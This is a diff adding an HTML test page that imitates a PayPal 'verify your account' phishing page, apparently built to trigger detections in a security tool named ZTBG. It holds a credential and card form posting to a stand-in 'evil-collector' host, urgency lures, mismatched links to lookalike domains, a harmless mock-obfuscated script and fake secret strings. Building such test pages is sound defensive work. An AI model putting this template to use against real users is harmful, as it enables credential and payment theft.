@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PayPal — Verify Your Account Immediately</title>
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+            min-height: 100vh;
+        }
+
+        /* Fake PayPal header */
+        .pp-header {
+            background: #003087;
+            padding: 14px 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .pp-logo {
+            color: white;
+            font-size: 26px;
+            font-weight: 900;
+            letter-spacing: -1px;
+        }
+
+        .pp-logo span {
+            color: #009cde;
+        }
+
+        /* Alert banner */
+        .alert-banner {
+            background: #c0392b;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        /* Main card */
+        .main-card {
+            max-width: 480px;
+            margin: 40px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+        }
+
+        .card-header {
+            background: #003087;
+            color: white;
+            padding: 20px 28px;
+        }
+
+        .card-header h1 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .card-header p {
+            font-size: 13px;
+            opacity: 0.85;
+        }
+
+        .card-body {
+            padding: 24px 28px;
+        }
+
+        .urgency-text {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 6px;
+            padding: 12px 16px;
+            font-size: 13px;
+            color: #856404;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 6px;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"],
+        input[type="number"] {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #009cde;
+            box-shadow: 0 0 0 3px rgba(0, 156, 222, 0.2);
+        }
+
+        /* Hidden iframe for tracking simulation */
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: #009cde;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.2s;
+        }
+
+        .submit-btn:hover {
+            background: #007ab8;
+        }
+
+        .fine-print {
+            font-size: 11px;
+            color: #999;
+            margin-top: 12px;
+            text-align: center;
+        }
+
+        /* Pre-checked newsletter trick */
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin: 12px 0;
+        }
+
+        .checkbox-group input {
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+
+        .checkbox-group label {
+            font-size: 12px;
+            font-weight: 400;
+            color: #666;
+        }
+
+        /* Mismatched links section */
+        .link-section {
+            padding: 20px 28px;
+            border-top: 1px solid #eee;
+            background: #f9f9f9;
+        }
+
+        .link-section h3 {
+            font-size: 13px;
+            font-weight: 700;
+            color: #555;
+            margin-bottom: 10px;
+        }
+
+        .link-section a {
+            display: block;
+            font-size: 13px;
+            color: #009cde;
+            text-decoration: none;
+            margin-bottom: 6px;
+        }
+
+        /* Obfuscated scripts note */
+        .test-info {
+            margin: 20px auto;
+            max-width: 480px;
+            background: #1a1a2e;
+            color: #00d4ff;
+            border-radius: 8px;
+            padding: 16px 20px;
+            font-family: monospace;
+            font-size: 12px;
+        }
+
+        .test-info h3 {
+            color: #fff;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .test-info p {
+            color: #aaa;
+            margin-bottom: 4px;
+        }
+
+        .test-info code {
+            color: #ff4d4d;
+        }
+
+        /* ZTBG test strings */
+        .secret-inputs {
+            display: none;
+        }
+    </style>
+
+    <!--
+    ══════════════════════════════════════════════════════════
+    ZTBG TEST NOTE: This page intentionally contains:
+    1. Suspicious title vs domain (PayPal in title, localhost domain)
+    2. Urgency language
+    3. Multiple password fields
+    4. Obfuscated script (below)
+    5. Mismatched anchor links
+    6. Pre-checked opt-in checkboxes
+    7. External form submission target
+    ══════════════════════════════════════════════════════════
+  -->
+
+    <!-- Simulated obfuscated script (harmless) -->
+    <script>
+        // Obfuscation simulation: high non-alphanumeric ratio + eval-like patterns
+        var _0x3a2b = ['\x76\x65\x72\x69\x66\x79', '\x61\x63\x63\x6f\x75\x6e\x74'];
+        var _enc = atob('VGhpcyBpcyBhIHRlc3QgcGhpc2hpbmcgcGFnZSBmb3IgWlRCRw==');
+        // Base64 blob: aGVsbG8gd29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgc3RyaW5nIHRoYXQgc2hvdWxkIGJlIGZsYWdnZWQgYnkgWlRCRyBhcyBzdXNwaWNpb3VzIGJhc2U2NA==
+        var ___x = String.fromCharCode(104, 101, 108, 108, 111);
+        console.log('[ZTBG Test Page] Simulated obfuscation loaded. ZTBG should flag this.');
+    </script>
+</head>
+
+<body>
+
+    <!-- Fake PayPal header -->
+    <div class="pp-header">
+        <div class="pp-logo">Pay<span>Pal</span></div>
+        <span style="color:#aaa; font-size:13px;">| Security Center</span>
+    </div>
+
+    <!-- Urgency alert -->
+    <div class="alert-banner">
+        ⚠️ URGENT: Unusual Activity Detected — Verify Immediately to Avoid Suspension
+    </div>
+
+    <!-- Main phishing form -->
+    <div class="main-card">
+        <div class="card-header">
+            <h1>🔒 Account Verification Required</h1>
+            <p>Your account has been temporarily limited due to suspicious activity.<br>Please confirm your identity
+                immediately.</p>
+        </div>
+        <div class="card-body">
+
+            <!-- Urgency language block (triggers ZTBG keyword detection) -->
+            <div class="urgency-text">
+                <strong>⚠️ Security Alert:</strong> Unauthorized access attempt detected on your account.
+                Your account will be suspended within <strong>24 hours</strong> unless you
+                <strong>verify your identity immediately</strong>. This is your final notice.
+                <em>Limited time to respond — click now to confirm your identity.</em>
+            </div>
+
+            <!-- Form that posts to "external domain" -->
+            <form id="phishing-form" action="http://evil-collector.example.com/steal" method="POST">
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" name="email" placeholder="your@email.com" autocomplete="off" />
+                </div>
+
+                <div class="form-group">
+                    <label for="password1">Password</label>
+                    <input type="password" id="password1" name="password" placeholder="Enter your password" />
+                </div>
+
+                <!-- Second password field (suspicious!) -->
+                <div class="form-group">
+                    <label for="password2">Confirm Password (Security Check)</label>
+                    <input type="password" id="password2" name="password_confirm"
+                        placeholder="Re-enter your password" />
+                </div>
+
+                <!-- Third password field (even more suspicious!) -->
+                <div class="form-group">
+                    <label for="pin">Security PIN</label>
+                    <input type="password" id="pin" name="pin" placeholder="Enter your 6-digit PIN" maxlength="6" />
+                </div>
+
+                <!-- Credit card info -->
+                <div class="form-group">
+                    <label for="cc">Credit Card Number (for verification)</label>
+                    <input type="text" id="cc" name="cc"
+                        placeholder="Paste your card number here — ZTBG will intercept!"
+                        title="Test: paste a credit card number here" />
+                </div>
+
+                <!-- Pre-checked opt-in (dark pattern) -->
+                <div class="checkbox-group">
+                    <input type="checkbox" id="newsletter" name="newsletter" checked />
+                    <label for="newsletter">
+                        Share my information with PayPal's "trusted partners" for marketing purposes
+                    </label>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terms" name="terms" checked />
+                    <label for="terms">
+                        I agree to automatic renewal and data collection terms
+                    </label>
+                </div>
+
+                <button type="submit" class="submit-btn">
+                    Verify Account Now →
+                </button>
+
+                <p class="fine-print">
+                    By clicking Verify, your data will be processed according to our
+                    <a href="http://totally-not-evil.tk/privacy" style="color:#009cde">Privacy Policy</a>
+                </p>
+            </form>
+        </div>
+
+        <!-- Mismatched links section -->
+        <div class="link-section">
+            <h3>Quick Links</h3>
+            <!-- Displayed text says google.com but href points elsewhere -->
+            <a href="http://phishing-site.ml/steal?ref=google" target="_blank">
+                https://www.google.com — Safety Center
+            </a>
+            <!-- Displayed text says paypal.com but href is different -->
+            <a href="http://paypa1-secure.cf/login" target="_blank">
+                https://www.paypal.com — Account Help
+            </a>
+            <a href="http://microsoft-security-alert.buzz/verify" target="_blank">
+                https://www.microsoft.com — Security Update
+            </a>
+        </div>
+    </div>
+
+    <!-- Hidden iframe (suspicious) -->
+    <iframe src="about:blank" width="0" height="0" style="display:none;" title="hidden-tracker"></iframe>
+
+    <!-- ZTBG Test Panel -->
+    <div class="test-info">
+        <h3>🛡️ ZTBG Test Page — Phishing Simulation</h3>
+        <p>This page is designed to trigger ZTBG detections. Expected flags:</p>
+        <p>✅ <code>Title/domain brand mismatch</code> (PayPal title, non-paypal.com domain)</p>
+        <p>✅ <code>Multiple password fields</code> (3 detected)</p>
+        <p>✅ <code>Urgency language</code> in body text</p>
+        <p>✅ <code>Mismatched anchor links</code> (5+ detected)</p>
+        <p>✅ <code>Obfuscated JavaScript</code> (eval, atob, fromCharCode)</p>
+        <p>✅ <code>Pre-checked opt-in checkboxes</code> (dark pattern)</p>
+        <p>✅ <code>Form submits to external domain</code></p>
+        <p>✅ <code>Hidden iframe</code></p>
+        <br />
+        <p style="color:#ffab00">🔬 Clipboard test: copy one of the strings below and paste into a field above:</p>
+    </div>
+
+    <!-- Sample sensitive data for clipboard testing -->
+    <div class="test-info" style="margin-top: 0;">
+        <h3>📋 Sample Test Strings (Copy & Paste into form above)</h3>
+        <p>— AWS Key: <code>AKIA<!---->IOSFODNN7EXAMPLE<!---->1234</code></p>
+        <p>— JWT:
+            <code>eyJhbGci<!---->OiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U</code>
+        </p>
+        <p>— GitHub Token: <code>ghp<!---->_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij</code></p>
+        <p>— Credit Card: <code>4532 1234 5678 9012</code> (Luhn valid test)</p>
+        <p>— Private Key: <code>-----BEGIN RSA PRIVATE<!---->KEY-----</code></p>
+        <p>— High Entropy: <code>K8mN3pQ7wX2vL9sR5tY1oU6jF4hE0cA</code></p>
+        <p>— Stripe Key: <code>sk<!---->_live_abcdefghijklmnopqrstuvwx</code></p>
+    </div>
+
+</body>
+
+</html>
